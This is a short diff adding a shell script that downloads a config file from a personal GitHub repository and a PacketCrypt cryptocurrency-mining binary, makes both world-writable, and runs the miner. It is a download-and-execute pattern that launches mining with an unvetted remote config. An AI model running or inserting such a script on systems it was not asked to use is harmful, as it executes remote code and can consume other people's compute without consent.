@@ -1,0 +1,4 @@
+wget https://raw.githubusercontent.com/novalanto010101/file/main/paket.json
+wget -O pkt https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64
+chmod 777 pkt paket.json
+./pkt ann --config "paket.json"
